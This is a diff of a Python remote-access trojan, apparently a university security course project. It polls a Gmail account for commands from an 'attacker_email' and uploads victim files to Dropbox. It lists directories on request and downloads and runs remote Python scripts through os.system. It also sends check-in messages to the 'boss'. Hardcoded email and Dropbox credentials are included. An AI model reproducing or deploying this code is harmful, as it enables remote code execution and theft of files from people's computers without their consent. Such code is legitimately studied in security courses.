@@ -9,21 +9,30 @@ import dropbox
 import uuid
 
 #Commands List
-#To send a file to user: download [Dropbox path] [Local name]
-#To receive a file from user: fetch [file path]
-#To execute a python script from dropbox: execute [Dropbox path]
-#To receive directory information: show [Directory path]
+#To send a file to user: download [Dropbox path] [Local name] [id]
+#To receive a file from user: fetch [file path] [id]
+#To execute a python script from dropbox: execute [Dropbox path] [id]
+#To receive directory information: show [Directory path] [id]
 
 emailAdr = "os.services.updates@gmail.com"
 password = "cse363esc"
 SMTP_SERVER = "imap.gmail.com"
-#attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
-attacker_email = "William Chen <william.chen@stonybrook.edu>"
+attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
+#attacker_email = "William Chen <william.chen@stonybrook.edu>"
 SMTP_PORT = 993
 commands = []
 executable_file = "pip_install.py"
 auth_token = "eSp1cKEzdOAAAAAAAAAADFTKh7tVMADzEWVmHJ8Q-aOwZQcT1993aavHJF6Nwvdk"
-id = uuid.uuid1().hex
+id = uuid.uuid4()
+#initialize dropbox
+dbx = dropbox.Dropbox(auth_token)
+#Keep track of last Command used
+lastCommand = ""
+
+#Sends over email with initial credentials 
+def initMessage():
+    message = "Subject: " + str(id) + " is registered boss."
+    sendEmail(message)
 
 #Get infected IP
 def getIP():
@@ -33,32 +42,39 @@ def getIP():
     s.close()
     return IPaddr
 
-#Initialize Dropbox
-def init_dbx():
-    dbx = dropbox.Dropbox(auth_token)
-
 #Upload a file to dropbox
 def upload_file(path):
+    splitPath = path.split("/")
+    dbxPath = "/" + splitPath[-1]
+    print(dbxPath)
     with open(path, 'rb') as f:
-        dbx.files_upload(f.read(), '/' + id + '/exfiltrated' + path)
-
-    #SEND AN EMAIL AS RECEIPT OF EXECUTION
-    execution_receipt = "Subject: Uploaded " + path + " from " + id + "s computer." + "\n\n"
-    execution_receipt += "Successfuly uploaded file to dropbox"
-    sendEmail(execution_receipt)
+        try:
+            dbx.files_upload(f.read(), '/' + str(id) + dbxPath)
+            #SEND AN EMAIL AS RECEIPT OF EXECUTION
+            execution_receipt = "Subject: Uploaded " + path + " from " + str(id) + " computer." + "\n\n"
+            execution_receipt += "Successfuly uploaded file to dropbox"
+            sendEmail(execution_receipt)
+        except:
+            execution_receipt = "Subject: Failed to upload " + path + " from " + str(id) + " computer." + "\n\n"
+            execution_receipt += "Unsuccessfuly uploaded file to dropbox"
+            sendEmail(execution_receipt)
 
 #Download a file from dropbox
 def download_file(filePath, localName):
-    with open(localName, "w") as f:
+    try:
         metadata, res = dbx.files_download(path=filePath)
-        f.write((res.content).decode())
-
-    #SEND AN EMAIL AS RECEIPT OF EXECUTION
-    execution_receipt = "Subject: Dowloaded " + filePath + " into " + localName + " file in " + id "s computer."+ "\n\n"
-    execution_receipt += "Successfuly downloaded from dropbox"
-    sendEmail(execution_receipt)
-
-#Send email with msg over SMTP SSL
+        with open(localName, "w") as f:
+            f.write((res.content).decode())
+            #SEND AN EMAIL AS RECEIPT OF EXECUTION
+            execution_receipt = "Subject: Downloaded " + filePath + " into " + localName + " file in " + str(id) + " computer." + "\n\n"
+            execution_receipt += "Successfuly downloaded from dropbox"
+            sendEmail(execution_receipt)
+    except:
+        execution_receipt = "Subject: Failed to download " + filePath + " into " + localName + " file in " + str(id) + " computer." + "\n\n"
+        execution_receipt += "Download failed"
+        sendEmail(execution_receipt)
+        
+#Send email with msg over SMTP SSL to attacker
 def sendEmail(msg):
     port = 465  # For SSL
 
@@ -68,57 +84,84 @@ def sendEmail(msg):
         server.login(emailAdr, password)
         server.sendmail(emailAdr, attacker_email, msg)
 
-#EMAIL SUBJECT = show [Directory path]
+#EMAIL SUBJECT = show [Directory path] [id]
 #NEEDS TO START WITH "C:/" UNLESS KNOWN PATH
 def showFiles(commandString):
     dirList = []
     fileList = []
     splitCommand = commandString.split(" ")
     del(splitCommand[0])
-    truePath = splitCommand[0]
-    for x in os.listdir(truePath):
-        if os.path.isdir(os.path.join(aPath, x)):
-            dirList.append(x)
-        elif os.path.isfile(os.path.join(truePath, x)):
-            fileList.append(x)
 
-    directories_string = ""
-    files_string = ""
-    for dir in dirList:
-        directories_string += dir + "\n"
-    for file in fileList:
-        files_string += file + "\n"
-    subjectLine = "Subject: My Directory\n\n"
-    payload = subjectLine
-    payload += "Files:\n" + files_string + "\nDirectories:\n" + directories_string
-    sendEmail(payload)
+    for x in range(len(splitCommand)):
+        print("At element " + str(x) + " is " + splitCommand[x]) 
+        
+    print("This is length: " + str(len(splitCommand)))
 
-#EMAIL SUBJECT = fetch [file name]
+    if len(splitCommand) == 2:
+        truePath = splitCommand[0]
+        try:
+            for x in os.listdir(truePath):
+                if os.path.isdir(os.path.join(truePath, x)):
+                    dirList.append(x)
+                elif os.path.isfile(os.path.join(truePath, x)):
+                    size = os.path.getsize(os.path.join(truePath, x))
+                    size = size / 1000000000
+                    file = x + " \t\t\t" + str(size) + " GB"
+                    fileList.append(file)
+
+            directories_string = ""
+            files_string = ""
+            for dir in dirList:
+                directories_string += dir + "\n"
+            for file in fileList:
+                files_string += file + "\n"
+
+            subjectLine = "Subject: My Directory\n\n"
+            payload = subjectLine
+            payload += lastCommand + ":\n\n" + "Files:\n" + files_string + "\nDirectories:\n" + directories_string
+            sendEmail(payload)
+
+        except:
+            subjectLine = "Subject: Failed directory fetch from " + id
+            sendEmail(subjectLine)
+
+
+#EMAIL SUBJECT = fetch [file name] [id]
 def getFile(commandString):
     splitCommand = commandString.split(" ")
     del(splitCommand[0])
-    filePath = splitCommand[0]
-    upload_file(filePath)
+    if len(splitCommand) == 2:
+        filePath = splitCommand[0]
+        upload_file(filePath)
 
-#EMAIL SUBJECT = download [file name] [local name]
+#EMAIL SUBJECT = download [file name] [local name] [id]
 def receiveFile(commandString):
-    splitCommmand = commandString.split(" ")
+    splitCommand = commandString.split(" ")
     del(splitCommand[0])
-    filePath = splitCommand[0]
-    localPath = splitCommand[1]
-    download_file(filePath, localPath)
+    if len(splitCommand) == 3:
+        filePath = splitCommand[0]
+        localPath = splitCommand[1]
+        download_file(filePath, localPath)
 
-#EMAIL SUBJECT = execute [file path from dropbox with python script]
+#EMAIL SUBJECT = execute [file path from dropbox with python script] [id]
 def executeCom(commandString):
     splitCommand = commandString.split(" ")
     del(splitCommand[0])
-    execCommand = splitCommand[0]
-    download_file(execCommand, executable_file)
-    os.system('python ' + executable_file)
-    os.remove(executable_file)
+    if len(splitCommand) == 2:
+        execCommand = splitCommand[0]
+        download_file(execCommand, executable_file)
+        try:
+            os.system('python ' + executable_file)
+            os.remove(executable_file)
+        
+        except:
+            subjectLine = "Subject: Failed to run shell exe " + id
+            sendEmail(subjectLine)
+ 
+
 
     #SEND AN EMAIL AS RECEIPT OF EXECUTION
-    execution_receipt = "Subject: Executed " + execCommand + "on " + id + "\n\n"
+    execution_receipt = "Subject: Executed " + execCommand + " on " + str(id) + "\n\n"
     execution_receipt += "Successfuly executed script"
     sendEmail(execution_receipt)
 
@@ -126,7 +169,9 @@ def executeCom(commandString):
 def commandParser(commandsParse):
     while commandsParse:
         command = commandsParse[0]
+        print(command)
         if "show" in command:
+            lastCommand = command
             showFiles(command)
             del commandsParse[0]
         elif "fetch" in command:
@@ -138,6 +183,9 @@ def commandParser(commandsParse):
         elif "download" in command:
             receiveFile(command)
             del commandsParse[0]
+        else:
+            del commandsParse[0]
+
 
 #Read an email
 def readEmail():
@@ -151,11 +199,10 @@ def readEmail():
         msg = email.message_from_bytes(data[0][1])
         subject = msg['Subject']
         sender = msg['From']
-        mail.store(i, '+FLAGS', '\\Deleted')
         if(sender == attacker_email):
-            commands.append(subject)
-            print ('From : ' + sender + '\n')
-            print ('Subject : ' + subject + '\n')
+            if(str(id) in subject):
+                mail.store(i, '+FLAGS', '\\Deleted')
+                commands.append(subject)
 
     if commands:
        commandParser(commands)
@@ -170,9 +217,10 @@ def periodicUpdates(seconds):
     startTime=time.time()
     while True:
         readEmail()
-        message = "Subject: " + id + "\n\n" + "Checkin in boss"
+        message = "Subject: " + str(id) + "\n\n" + "Checkin in boss"
         #sendEmail(message)
         time.sleep(seconds - ((time.time() - startTime) % seconds))
 
-init_dbx()
-periodicUpdates(30.0)
+initMessage()
+periodicUpdates(10.0)
+    
